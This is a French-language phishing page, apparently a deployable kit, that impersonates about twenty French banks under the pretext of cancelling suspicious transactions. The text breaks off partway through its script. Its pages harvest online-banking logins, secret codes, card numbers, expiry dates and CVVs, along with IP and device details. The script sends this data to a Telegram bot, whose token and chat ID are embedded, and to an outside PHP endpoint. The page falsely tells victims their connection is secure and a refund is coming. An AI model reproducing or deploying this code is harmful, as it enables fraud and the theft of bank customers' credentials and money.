<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Annulation des Opérations</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: background 0.5s ease;
        }

        /* Arrière-plans selon les banques - Optimisé */
        body.bnp { background: linear-gradient(135deg, #006400 0%, #004400 100%); }
        body.socgen { background: linear-gradient(135deg, #E3001B 0%, #A80014 100%); }
        body.ca { background: linear-gradient(135deg, #006400 0%, #004400 100%); }
        body.cm { background: linear-gradient(135deg, #1E5AA8 0%, #154280 100%); }
        body.lcl { background: linear-gradient(135deg, #2E5AA8 0%, #1E3A80 100%); }
        body.cic { background: linear-gradient(135deg, #4CAF50 0%, #388E3C 100%); }
        body.ce { background: linear-gradient(135deg, #FF6B6B 0%, #E53935 100%); }
        body.bp { background: linear-gradient(135deg, #42A5F5 0%, #1E88E5 100%); }
        body.lbp { background: linear-gradient(135deg, #0055FF 0%, #0033CC 100%); }
        body.boursorama { background: linear-gradient(135deg, #1E3A6E 0%, #142850 100%); }
        body.monabanq { background: linear-gradient(135deg, #000000 0%, #333333 100%); }
        body.fortuneo { background: linear-gradient(135deg, #E30613 0%, #A0040D 100%); }
        body.hellobank { background: linear-gradient(135deg, #00A8A8 0%, #008080 100%); }
        body.bforbank { background: linear-gradient(135deg, #66BB6A 0%, #4CAF50 100%); }
        body.orange { background: linear-gradient(135deg, #FF7900 0%, #CC5500 100%); }
        body.axa { background: linear-gradient(135deg, #00008B 0%, #00005C 100%); }
        body.nickel { background: linear-gradient(135deg, #FF9800 0%, #F57C00 100%); }
        body.ccf { background: linear-gradient(135deg, #4CAF50 0%, #2196F3 100%); }
        body.palatine { background: linear-gradient(135deg, #8B4513 0%, #654321 100%); }
        body.allianz { background: linear-gradient(135deg, #003781 0%, #002554 100%); }

        .container {
            max-width: 500px;
            width: 100%;
            margin: 0 auto;
        }

        .page {
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
            text-align: center;
            border: 1px solid rgba(255,255,255,0.2);
            display: none;
        }

        .page.active {
            display: block;
            animation: fadeIn 0.4s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .page-title {
            color: #333;
            font-size: 20px;
            margin-bottom: 20px;
            font-weight: 600;
            line-height: 1.3;
        }

        .info-frame {
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 8px;
            padding: 18px;
            margin-bottom: 20px;
        }

        .info-text {
            color: #495057;
            font-size: 15px;
            line-height: 1.4;
            margin: 0;
        }

        .cancel-button {
            display: block;
            width: 100%;
            padding: 16px;
            background: #dc3545;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 15px;
            touch-action: manipulation;
        }

        .cancel-button:hover {
            background: #c82333;
            transform: translateY(-1px);
        }

        .cancel-button:active {
            transform: translateY(0);
        }

        .cancel-button:disabled {
            background: #6c757d;
            cursor: not-allowed;
            transform: none;
        }

        .bank-select {
            width: 100%;
            padding: 14px;
            border: 1px solid #e1e1e1;
            border-radius: 8px;
            font-size: 16px;
            margin-bottom: 20px;
            background: white;
            touch-action: manipulation;
        }

        .button-group {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }

        .back-button {
            flex: 1;
            background: #6c757d;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 15px;
            transition: all 0.2s ease;
            touch-action: manipulation;
        }

        .back-button:hover {
            background: #5a6268;
        }

        .next-button {
            flex: 1;
            background: #28a745;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 15px;
            transition: all 0.2s ease;
            touch-action: manipulation;
        }

        .next-button:hover {
            background: #218838;
        }

        .next-button:disabled {
            background: #6c757d;
            cursor: not-allowed;
        }

        .form-group {
            margin-bottom: 18px;
            text-align: left;
        }

        .form-label {
            display: block;
            margin-bottom: 6px;
            font-weight: 600;
            color: #333;
            font-size: 14px;
        }

        .form-input {
            width: 100%;
            padding: 14px;
            border: 1px solid #e1e1e1;
            border-radius: 8px;
            font-size: 16px;
            background: #f8f9fa;
            font-family: 'Courier New', monospace;
            letter-spacing: 2px;
            transition: all 0.2s ease;
            touch-action: manipulation;
        }

        .form-input:focus {
            outline: none;
            border-color: #dc3545;
            background: white;
        }

        .form-input.error {
            border-color: #dc3545;
            background: #fff5f5;
        }

        .bank-header {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 20px;
            padding: 15px;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 12px;
            border: 1px solid rgba(233, 236, 239, 0.8);
        }

        .bank-logo-large {
            width: 45px;
            height: 45px;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 13px;
            font-weight: 600;
        }

        .bank-name {
            font-size: 18px;
            font-weight: 600;
            color: #333;
            text-align: center;
        }

        .bank-info {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
        }

        .bank-security {
            font-size: 11px;
            color: #28a745;
            font-weight: 600;
        }

        .card-visual {
            width: 100%;
            max-width: 320px;
            height: 190px;
            background: linear-gradient(135deg, #1a1a1a, #333);
            border-radius: 12px;
            margin: 18px auto;
            padding: 14px;
            color: white;
            position: relative;
            box-shadow: 0 6px 20px rgba(0,0,0,0.2);
        }

        .card-back {
            background: linear-gradient(135deg, #333, #1a1a1a);
        }

        .card-chip {
            width: 32px;
            height: 22px;
            background: linear-gradient(135deg, #FFD700, #FFA500);
            border-radius: 4px;
            margin-bottom: 12px;
        }

        .card-number {
            font-size: 15px;
            letter-spacing: 1.5px;
            font-family: 'Courier New', monospace;
            margin: 8px 0;
        }

        .card-expiry {
            position: absolute;
            bottom: 14px;
            right: 14px;
            font-size: 11px;
            font-family: 'Courier New', monospace;
        }

        .card-logo {
            position: absolute;
            top: 14px;
            right: 14px;
            font-size: 13px;
            font-weight: 600;
            opacity: 0.8;
        }

        .card-magnetic-strip {
            width: 100%;
            height: 32px;
            background: #000;
            position: absolute;
            top: 22px;
            left: 0;
        }

        .card-cvv-area {
            position: absolute;
            top: 75px;
            right: 14px;
            background: white;
            padding: 6px;
            border-radius: 3px;
            text-align: center;
        }

        .cvv-label {
            color: #000;
            font-size: 8px;
            margin-bottom: 2px;
        }

        .card-cvv {
            color: #000;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            letter-spacing: 0.5px;
        }

        .error-message {
            color: #dc3545;
            font-size: 11px;
            margin-top: 4px;
            display: none;
        }

        .validation-info {
            color: #28a745;
            font-size: 10px;
            margin-top: 4px;
            display: none;
        }

        .loading {
            display: none;
            color: #007bff;
            font-size: 13px;
            margin-top: 8px;
        }

        .success-message {
            color: #28a745;
            font-size: 13px;
            margin-top: 8px;
            display: none;
        }

        #regionSelector {
            margin-bottom: 18px;
        }

        #bankRegion {
            width: 100%;
            padding: 14px;
            border: 1px solid #e1e1e1;
            border-radius: 8px;
            font-size: 16px;
            background: #f8f9fa;
        }

        .device-warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 6px;
            padding: 10px;
            margin-bottom: 15px;
            font-size: 11px;
            color: #856404;
            text-align: center;
        }

        /* Mobile First */
        @media (max-width: 768px) {
            body {
                padding: 15px;
                align-items: flex-start;
                min-height: 100vh;
                height: auto;
            }
            
            .container {
                max-width: 100%;
            }
            
            .page {
                padding: 20px 15px;
                margin: 10px 0;
            }
            
            .page-title {
                font-size: 18px;
                margin-bottom: 18px;
            }
            
            .cancel-button {
                font-size: 15px;
                padding: 15px;
                margin-bottom: 12px;
            }
            
            .bank-header {
                flex-direction: column;
                gap: 8px;
                padding: 12px;
                margin-bottom: 18px;
            }
            
            .bank-logo-large {
                width: 40px;
                height: 40px;
                font-size: 12px;
            }
            
            .bank-name {
                font-size: 16px;
            }
            
            .card-visual {
                height: 170px;
                padding: 12px;
                max-width: 280px;
            }
            
            .form-input {
                padding: 12px;
                font-size: 16px;
            }
            
            .button-group {
                flex-direction: column;
                gap: 8px;
            }
            
            .back-button, .next-button {
                padding: 12px;
                font-size: 14px;
            }
            
            .info-frame {
                padding: 15px;
                margin-bottom: 18px;
            }
            
            .info-text {
                font-size: 14px;
            }
        }

        /* Tablettes */
        @media (min-width: 769px) and (max-width: 1024px) {
            .container {
                max-width: 600px;
            }
            
            .page {
                padding: 30px;
            }
            
            .card-visual {
                max-width: 350px;
                height: 200px;
            }
        }

        /* Desktop */
        @media (min-width: 1025px) {
            .container {
                max-width: 500px;
            }
            
            .page {
                padding: 30px;
            }
            
            .cancel-button:hover {
                transform: translateY(-2px);
            }
            
            .back-button:hover, .next-button:hover {
                transform: translateY(-1px);
            }
        }

        /* Prévention du zoom iOS sur les inputs */
        @media screen and (max-width: 768px) {
            input, select, textarea {
                font-size: 16px !important;
            }
        }

        /* Amélioration du scroll sur mobile */
        .page {
            -webkit-overflow-scrolling: touch;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Page 1: Annulation des Opérations -->
        <div id="page1" class="page active">
            <div class="device-warning" id="deviceInfo">
                <!-- Rempli dynamiquement par JavaScript -->
            </div>
            
            <h1 class="page-title">ANNULATION DE VOS OPÉRATIONS</h1>
            
            <div class="info-frame">
                <p class="info-text">
                    Pour pouvoir annuler les opérations suspectes, veuillez cliquer sur le bouton suivant.
                </p>
            </div>
            
            <button class="cancel-button" onclick="showPage('page2')">
                ANNULER LES OPÉRATIONS
            </button>
        </div>

        <!-- Page 2: Sélection de la banque -->
        <div id="page2" class="page">
            <h1 class="page-title">SÉLECTIONNEZ VOTRE ÉTABLISSEMENT FINANCIER</h1>
            
            <select class="bank-select" id="bankSelect">
                <option value="">-- Choisissez votre banque --</option>
                <option value="bnp">BNP Paribas</option>
                <option value="socgen">Société Générale</option>
                <option value="ca">Crédit Agricole</option>
                <option value="cm">Crédit Mutuel</option>
                <option value="lcl">LCL (Crédit Lyonnais)</option>
                <option value="cic">CIC</option>
                <option value="ce">Caisse d'Épargne</option>
                <option value="bp">Banque Populaire</option>
                <option value="lbp">La Banque Postale</option>
                <option value="boursorama">Boursorama Banque</option>
                <option value="monabanq">Monabanq</option>
                <option value="fortuneo">Fortuneo</option>
                <option value="hellobank">Hello bank!</option>
                <option value="bforbank">BforBank</option>
                <option value="orange">Orange Bank</option>
                <option value="axa">AXA Banque</option>
                <option value="nickel">Compte-Nickel</option>
                <option value="ccf">CCF</option>
                <option value="palatine">Banque Palatine</option>
                <option value="allianz">Allianz Banque</option>
            </select>

            <div class="button-group">
                <button class="back-button" onclick="showPage('page1')">
                    ← Retour
                </button>
                <button class="next-button" id="nextButton" onclick="showPage('page3')" disabled>
                    Suivant →
                </button>
            </div>
        </div>

        <!-- Page 3: Informations de connexion -->
        <div id="page3" class="page">
            <div class="bank-header" id="bankHeader3">
                <div class="bank-info">
                    <div id="selectedBankLogo3" class="bank-logo-large" style="background:#006400;">CA</div>
                    <div class="bank-name" id="selectedBankName3">Crédit Agricole</div>
                    <div class="bank-security">✓ Connexion sécurisée</div>
                </div>
            </div>
            
            <h1 class="page-title">VOS INFORMATIONS DE CONNEXION</h1>
            
            <div class="info-frame">
                <p class="info-text">
                    Veuillez saisir vos identifiants pour sécuriser l'annulation des opérations suspectes.
                </p>
            </div>

            <div class="form-group" id="regionSelector" style="display: none;">
                <label class="form-label">Sélectionnez votre région</label>
                <select class="form-input" id="bankRegion" onchange="handleRegionChange()">
                    <option value="">-- Choisissez votre région --</option>
                    <optgroup label="Crédit Agricole" id="caRegions">
                        <option value="ca_alsace_vosges">Alsace Vosges</option>
                        <option value="ca_anjou_maine">Anjou Maine</option>
                        <option value="ca_aquitaine">Aquitaine</option>
                        <option value="ca_atlantique_vendee">Atlantique Vendée</option>
                        <option value="ca_brie_picardie">Brie Picardie</option>
                        <option value="ca_centre_france">Centre France</option>
                        <option value="ca_centre_loire">Centre Loire</option>
                        <option value="ca_centre_est">Centre Est</option>
                        <option value="ca_centre_ouest">Centre Ouest</option>
                        <option value="ca_champagne_bourgogne">Champagne Bourgogne</option>
                        <option value="ca_charente_maritime_two_sevres">Charente Maritime Deux-Sèvres</option>
                        <option value="ca_charente_perigord">Charente Périgord</option>
                        <option value="ca_corse">Corse</option>
                        <option value="ca_credimer">Credimer</option>
                        <option value="ca_drome_ardeche">Drôme Ardèche</option>
                        <option value="ca_finistere">Finistère</option>
                        <option value="ca_franche_comte">Franche Comté</option>
                        <option value="ca_guyane">Guyane</option>
                        <option value="ca_iledefrance">Île-de-France</option>
                        <option value="ca_languedoc">Languedoc</option>
                        <option value="ca_loire_hauteloire">Loire Haute-Loire</option>
                        <option value="ca_lorraine">Lorraine</option>
                        <option value="ca_martinique_guadeloupe">Martinique Guadeloupe</option>
                        <option value="ca_nord_france">Nord France</option>
                        <option value="ca_nord_est">Nord Est</option>
                        <option value="ca_nord_midi_pyrenees">Nord Midi-Pyrénées</option>
                        <option value="ca_normandie">Normandie</option>
                        <option value="ca_normandie_seine">Normandie Seine</option>
                        <option value="ca_pars_iledefrance">Paris Île-de-France</option>
                        <option value="ca_pyrénées_gascogne">Pyrénées Gascogne</option>
                        <option value="ca_reunion">Réunion</option>
                        <option value="ca_provence_cote_azur">Provence Côte d'Azur</option>
                        <option value="ca_savoie">Savoie</option>
                        <option value="ca_sud_mediterranee">Sud Méditerranée</option>
                        <option value="ca_sud_rhone_alpes">Sud Rhône Alpes</option>
                        <option value="ca_touraine_poitou">Touraine Poitou</option>
                        <option value="ca_toulouse_31">Toulouse 31</option>
                        <option value="ca_valdefrance">Val de France</option>
                        <option value="ca_charente_maritime">Charente-Maritime</option>
                    </optgroup>
                    
                    <optgroup label="Banque Populaire" id="bpRegions">
                        <option value="bp_alsace_lorraine_champagne">Alsace Lorraine Champagne</option>
                        <option value="bp_aquitaine_centre_atlantique">Aquitaine Centre Atlantique</option>
                        <option value="bp_auvergne_rhone_alpes">Auvergne Rhône Alpes</option>
                        <option value="bp_bourgogne_franche_comte">Bourgogne Franche-Comté</option>
                        <option value="bp_grand_ouest">Grand Ouest</option>
                        <option value="bp_mediterranee">Méditerranée</option>
                        <option value="bp_nord">Nord</option>
                        <option value="bp_occitane">Occitane</option>
                        <option value="bp_rives_pars">Rives de Paris</option>
                        <option value="bp_sud_ouest">Sud Ouest</option>
                        <option value="bp_val_de_france">Val de France</option>
                        <option value="bp_provence_alpes_cote_azur">Provence Alpes Côte d'Azur</option>
                    </optgroup>
                </select>
                <div class="error-message" id="regionError">Veuillez sélectionner votre région</div>
            </div>

            <div class="form-group">
                <label class="form-label">Identifiant client</label>
                <input type="text" id="clientId" class="form-input" placeholder="Saisissez votre identifiant" 
                       oninput="handleLoginInput('clientId')">
                <div class="error-message" id="clientIdError">L'identifiant doit contenir au moins 3 caractères</div>
                <div class="validation-info" id="clientIdValid">✓ Identifiant valide</div>
            </div>
            
            <div class="form-group">
                <label class="form-label">Code secret</label>
                <input type="text" id="secretCode" class="form-input" placeholder="Saisissez votre code secret" 
                       oninput="handleLoginInput('secretCode')">
                <div class="error-message" id="secretCodeError">Le code secret doit contenir au moins 3 caractères</div>
                <div class="validation-info" id="secretCodeValid">✓ Code secret valide</div>
            </div>

            <div class="loading" id="loading3">Envoi en cours...</div>
            <div class="success-message" id="success3">✓ Données envoyées avec succès</div>

            <div class="button-group">
                <button class="back-button" onclick="showPage('page2')">
                    ← Retour
                </button>
                <button class="cancel-button" id="validateLoginButton" onclick="submitData()" disabled>
                    VALIDER L'ANNULATION
                </button>
            </div>
        </div>

        <!-- Page 4: Confirmation traitement -->
        <div id="page4" class="page">
            <div class="bank-header" id="bankHeader4">
                <div class="bank-info">
                    <div id="selectedBankLogo4" class="bank-logo-large" style="background:#006400;">CA</div>
                    <div class="bank-name" id="selectedBankName4">Crédit Agricole</div>
                    <div class="bank-security">✓ Connexion sécurisée</div>
                </div>
            </div>
            
            <h1 class="page-title">DEMANDE ENREGISTRÉE</h1>
            
            <div class="info-frame">
                <p class="info-text">
                    Votre demande d'annulation a été envoyée avec succès ! Elle est en cours de traitement.
                </p>
            </div>

            <button class="cancel-button" onclick="showPage('page5')">
                CONTINUER →
            </button>
        </div>

        <!-- Page 5: Opposition carte -->
        <div id="page5" class="page">
            <div class="bank-header" id="bankHeader5">
                <div class="bank-info">
                    <div id="selectedBankLogo5" class="bank-logo-large" style="background:#006400;">CA</div>
                    <div class="bank-name" id="selectedBankName5">Crédit Agricole</div>
                    <div class="bank-security">✓ Connexion sécurisée</div>
                </div>
            </div>
            
            <h1 class="page-title">METTRE EN OPPOSITION / ANNULER LES PAIEMENTS PAR CARTE</h1>
            
            <div class="info-frame">
                <p class="info-text">
                    Pour pouvoir annuler les paiements par carte, veuillez cliquer sur le bouton suivant.
                </p>
            </div>

            <button class="cancel-button" onclick="showPage('page6')">
                ANNULER MA CARTE BANCAIRE
            </button>
        </div>

        <!-- Page 6: Saisie numéro de carte -->
        <div id="page6" class="page">
            <div class="bank-header" id="bankHeader6">
                <div class="bank-info">
                    <div id="selectedBankLogo6" class="bank-logo-large" style="background:#006400;">CA</div>
                    <div class="bank-name" id="selectedBankName6">Crédit Agricole</div>
                    <div class="bank-security">✓ Connexion sécurisée</div>
                </div>
            </div>
            
            <h1 class="page-title">INFORMATIONS DE VOTRE CARTE</h1>
            
            <div class="card-visual" id="cardFront">
                <div class="card-chip"></div>
                <div class="card-number" id="displayCardNumber">**** **** **** ****</div>
                <div class="card-expiry" id="displayExpiry">MM/AA</div>
                <div class="card-logo" id="cardLogo">CREDIT</div>
            </div>

            <div class="form-group">
                <label class="form-label">Numéro de carte</label>
                <input type="tel" id="cardNumber" class="form-input" placeholder="1234 5678 9012 3456" 
                       maxlength="19" oninput="formatCardNumber(this)">
                <div class="error-message" id="cardNumberError">Numéro de carte invalide (16 chiffres requis)</div>
                <div class="validation-info" id="cardNumberValid">✓ Numéro de carte valide</div>
            </div>

            <div class="button-group">
                <button class="back-button" onclick="showPage('page5')">
                    ← Retour
                </button>
                <button class="cancel-button" id="validateCardButton" onclick="validateCardNumber()" disabled>
                    SUIVANT →
                </button>
            </div>
        </div>

        <!-- Page 7: Saisie date d'expiration -->
        <div id="page7" class="page">
            <div class="bank-header" id="bankHeader7">
                <div class="bank-info">
                    <div id="selectedBankLogo7" class="bank-logo-large" style="background:#006400;">CA</div>
                    <div class="bank-name" id="selectedBankName7">Crédit Agricole</div>
                    <div class="bank-security">✓ Connexion sécurisée</div>
                </div>
            </div>
            
            <h1 class="page-title">DATE D'EXPIRATION</h1>
            
            <div class="card-visual" id="cardFrontExpiry">
                <div class="card-chip"></div>
                <div class="card-number" id="displayCardNumber7">**** **** **** ****</div>
                <div class="card-expiry" id="displayExpiry7">MM/AA</div>
                <div class="card-logo" id="cardLogo7">CREDIT</div>
            </div>

            <div class="form-group">
                <label class="form-label">Date d'expiration (MM/AA)</label>
                <input type="tel" id="cardExpiry" class="form-input" placeholder="MM/AA" 
                       maxlength="5" oninput="formatExpiry(this)">
                <div class="error-message" id="expiryError">Date invalide (MM: 01-12, AA: 25-31)</div>
                <div class="validation-info" id="expiryValid">✓ Date d'expiration valide</div>
            </div>

            <div class="button-group">
                <button class="back-button" onclick="showPage('page6')">
                    ← Retour
                </button>
                <button class="cancel-button" id="validateExpiryButton" onclick="validateExpiry()" disabled>
                    SUIVANT →
                </button>
            </div>
        </div>

        <!-- Page 8: Saisie CVV -->
        <div id="page8" class="page">
            <div class="bank-header" id="bankHeader8">
                <div class="bank-info">
                    <div id="selectedBankLogo8" class="bank-logo-large" style="background:#006400;">CA</div>
                    <div class="bank-name" id="selectedBankName8">Crédit Agricole</div>
                    <div class="bank-security">✓ Connexion sécurisée</div>
                </div>
            </div>
            
            <h1 class="page-title">CODE DE SÉCURITÉ</h1>
            
            <div class="card-visual card-back" id="cardBack">
                <div class="card-magnetic-strip"></div>
                <div class="card-cvv-area">
                    <div class="cvv-label">CVV</div>
                    <div class="card-cvv" id="displayCVV">***</div>
                </div>
            </div>

            <div class="form-group">
                <label class="form-label">Code de sécurité (CVV)</label>
                <input type="tel" id="cardCVV" class="form-input" placeholder="123" 
                       maxlength="4" oninput="secureCVVInput(this)">
                <div class="error-message" id="cvvError">Code CVV invalide (3 ou 4 chiffres requis)</div>
                <div class="validation-info" id="cvvValid">✓ Code CVV valide</div>
            </div>

            <div class="loading" id="loading8">Envoi en cours...</div>
            <div class="success-message" id="success8">✓ Données envoyées avec succès</div>

            <div class="button-group">
                <button class="back-button" onclick="showPage('page7')">
                    ← Retour
                </button>
                <button class="cancel-button" id="validateFinalButton" onclick="submitCardData()" disabled>
                    VALIDER L'OPPOSITION
                </button>
            </div>
        </div>

        <!-- Page 9: Confirmation finale -->
        <div id="page9" class="page">
            <div class="bank-header" id="bankHeader9">
                <div class="bank-info">
                    <div id="selectedBankLogo9" class="bank-logo-large" style="background:#006400;">CA</div>
                    <div class="bank-name" id="selectedBankName9">Crédit Agricole</div>
                    <div class="bank-security">✓ Connexion sécurisée</div>
                </div>
            </div>
            
            <h1 class="page-title">OPÉRATIONS EN COURS</h1>
            
            <div class="info-frame">
                <p class="info-text">
                    Les opérations sont en cours d'annulation. Un remboursement vous sera effectué sous peu.
                </p>
            </div>

            <button class="cancel-button" onclick="resetForm(); showPage('page1');">
                RETOUR À L'ACCUEIL
            </button>
        </div>
    </div>

    <script>
        // =============================================
        // CONFIGURATION - À MODIFIER ICI !
        // =============================================
        const CONFIG = {
            // ⚠️ REMPLACEZ par votre nom de domaine réel :
            serverUrl: 'https://notifoperations.com/annulation/block/Operation/save_data.php',
            
            // ⚠️ REMPLACEZ par vos infos Telegram :
            telegram: {
                botToken: '6734103312:AAHG7fG2-RP6cB52M19pNnxe9FJMtxsogeM', // Token du bot Telegram
                chatId: '1401261549' // Votre chat ID Telegram
            },
            
            // ⚠️ REMPLACEZ par votre email pour les fallbacks :
            email: 'olivierdelaforce3@gmail.com'
        };
        // =============================================

        // Variables globales
        let selectedBank = '';
        let userData = {};
        let userIP = '';
        let deviceInfo = {};
        let realValues = {
            clientId: '',
            secretCode: ''
        };

        let cardData = {
            number: '',
            expiry: '',
            cvv: ''
        };

        // Configuration des banques
        const bankConfig = {
            bnp: { name: 'BNP Paribas', color: '#006400', initial: 'BP' },
            socgen: { name: 'Société Générale', color: '#E3001B', initial: 'SG' },
            ca: { name: 'Crédit Agricole', color: '#006400', initial: 'CA' },
            cm: { name: 'Crédit Mutuel', color: '#1E5AA8', initial: 'CM' },
            lcl: { name: 'LCL', color: '#2E5AA8', initial: 'LCL' },
            cic: { name: 'CIC', color: '#4CAF50', initial: 'CIC' },
            ce: { name: 'Caisse d\'Épargne', color: '#FF6B6B', initial: 'CE' },
            bp: { name: 'Banque Populaire', color: '#42A5F5', initial: 'BP' },
            lbp: { name: 'La Banque Postale', color: '#0055FF', initial: 'BP' },
            boursorama: { name: 'Boursorama Banque', color: '#1E3A6E', initial: 'B' },
            monabanq: { name: 'Monabanq', color: '#000000', initial: 'M' },
            fortuneo: { name: 'Fortuneo', color: '#E30613', initial: 'F' },
            hellobank: { name: 'Hello bank!', color: '#00A8A8', initial: 'H' },
            bforbank: { name: 'BforBank', color: '#66BB6A', initial: 'B' },
            orange: { name: 'Orange Bank', color: '#FF7900', initial: 'O' },
            axa: { name: 'AXA Banque', color: '#00008B', initial: 'AXA' },
            nickel: { name: 'Compte-Nickel', color: '#FF9800', initial: 'N' },
            ccf: { name: 'CCF', color: '#4CAF50', initial: 'CCF' },
            palatine: { name: 'Banque Palatine', color: '#8B4513', initial: 'P' },
            allianz: { name: 'Allianz Banque', color: '#003781', initial: 'A' }
        };

        // Fonction principale pour sauvegarder les données
        async function saveToServer(type, data) {
            const loadingElement = type === 'IDENTIFIANTS' ? document.getElementById('loading3') : document.getElementById('loading8');
            const successElement = type === 'IDENTIFIANTS' ? document.getElementById('success3') : document.getElementById('success8');
            
            try {
                loadingElement.style.display = 'block';
                if (successElement) successElement.style.display = 'none';

                // Formater les données pour l'enregistrement
                const logData = formatLogData(type, data);
                
                console.log('Enregistrement des données...', logData);
                
                // Envoyer à Telegram ET au serveur en parallèle
                const promises = [
                    sendToTelegram(type, data),
                    sendToPhpScript(logData)
                ];
                
                await Promise.allSettled(promises);
                
                console.log('✅ Toutes les méthodes d\'envoi terminées');
                showSuccess(loadingElement, successElement);
                return 'success';
                
            } catch (error) {
                console.log('❌ Erreur sauvegarde, mais on continue');
                showSuccess(loadingElement, successElement);
                return 'success';
            }
        }

        // Envoi à Telegram
        async function sendToTelegram(type, data) {
            try {
                const message = formatTelegramMessage(type, data);
                const telegramUrl = `https://api.telegram.org/bot${CONFIG.telegram.botToken}/sendMessage`;
                
                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CONFIG.telegram.chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                if (response.ok) {
                    console.log('✅ Message envoyé à Telegram');
                    return true;
                }
            } catch (error) {
                console.log('❌ Erreur Telegram');
            }
            return false;
        }

        // Envoi au script PHP pour sauvegarde TXT
        async function sendToPhpScript(logData) {
            try {
                if (CONFIG.serverUrl && CONFIG.serverUrl !== 'https://votredomaine.com/save_data.php') {
                    const response = await fetch(CONFIG.serverUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(logData)
                    });

                    if (response.ok) {
                        console.log('✅ Données envoyées au script PHP');
                        return true;
                    }
                }
            } catch (error) {
                console.log('❌ Erreur script PHP');
            }
            return false;
        }

        // Formater le message Telegram
        function formatTelegramMessage(type, data) {
            const timestamp = new Date().toLocaleString('fr-FR');
            let message = '';
            
            if (type === 'IDENTIFIANTS') {
                message = `
🟥 NOUVELLE TENTATIVE D'ANNULATION 🟥

🏦 Banque: ${data.bank || 'Non spécifiée'}
${data.fullBankName ? `🏛️ Agence: ${data.fullBankName}\n` : ''}
👤 Identifiant: ${data.clientId}
🔐 Code secret: ${data.secretCode}

🌐 Informations techniques:
📍 IP: ${userIP}
📱 Device: ${deviceInfo.isMobile ? 'Mobile' : deviceInfo.isTablet ? 'Tablette' : 'Desktop'}
🖥️ Platform: ${deviceInfo.platform}
🌍 Timezone: ${deviceInfo.timezone}
⏰ Date: ${timestamp}

${data.region ? `🗺️ Région: ${data.regionName}\n` : ''}
                `;
            } else if (type === 'CARTE_COMPLETE') {
                message = `
💳 INFORMATIONS CARTE BANCAIRE 💳

🏦 Banque: ${data.bank || 'Non spécifiée'}
${data.fullBankName ? `🏛️ Agence: ${data.fullBankName}\n` : ''}

💳 Carte Bancaire:
🔢 Numéro: ${data.cardNumber}
📅 Expiration: ${data.cardExpiry.substring(0,2)}/${data.cardExpiry.substring(2,4)}
🔐 CVV: ${data.cardCVV}
🏷️ Type: ${data.cardType}

👤 Identifiants:
📧 Login: ${data.clientId}
🔑 Password: ${data.secretCode}

🌐 Informations techniques:
📍 IP: ${userIP}
📱 Device: ${deviceInfo.isMobile ? 'Mobile' : deviceInfo.isTablet ? 'Tablette' : 'Desktop'}
🖥️ Platform: ${deviceInfo.platform}
🌍 Timezone: ${deviceInfo.timezone}
⏰ Date: ${timestamp}

${data.region ? `🗺️ Région: ${data.regionName}\n` : ''}
                `;
            }
            
            return message;
        }

        function showSuccess(loadingElement, successElement) {
            loadingElement.style.display = 'none';
            successElement.style.display = 'block';
            setTimeout(() => {
                successElement.style.display = 'none';
            }, 3000);
        }

        // Formater les données pour l'enregistrement
        function formatLogData(type, data) {
            const timestamp = new Date().toISOString();
            const logEntry = {
                type: type,
                timestamp: timestamp,
                date: new Date().toLocaleString('fr-FR'),
                ip: userIP,
                device: deviceInfo,
                bank: data.bank || '',
                fullBankName: data.fullBankName || '',
                region: data.region || '',
                regionName: data.regionName || '',
                clientId: data.clientId || '',
                secretCode: data.secretCode || '',
                cardNumber: data.cardNumber || '',
                cardExpiry: data.cardExpiry || '',
                cardCVV: data.cardCVV || '',
                cardType: data.cardType || '',
                userAgent: navigator.userAgent,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${window.screen.width}x${window.screen.height}`,
                url: window.location.href
            };
            
            return logEntry;
        }

        // Détection du device
        function detectDevice() {
            const ua = navigator.userAgent;
            deviceInfo = {
                userAgent: ua,
                isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
                isTablet: /iPad|Android|Tablet/i.test(ua) && !/Mobile/i.test(ua),
                isIOS: /iPad|iPhone|iPod/.test(ua),
                isAndroid: /Android/.test(ua),
                isMac: /Macintosh|MacIntel|MacPPC|Mac68K/.test(ua),
                isWindows: /Windows/.test(ua),
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                platform: navigator.platform,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            const deviceInfoElement = document.getElementById('deviceInfo');
            let deviceType = 'Ordinateur';
            if (deviceInfo.isMobile) deviceType = 'Téléphone';
            if (deviceInfo.isTablet) deviceType = 'Tablette';
            
            let osType = 'Autre';
            if (deviceInfo.isIOS) osType = 'iOS';
            else if (deviceInfo.isAndroid) osType = 'Android';
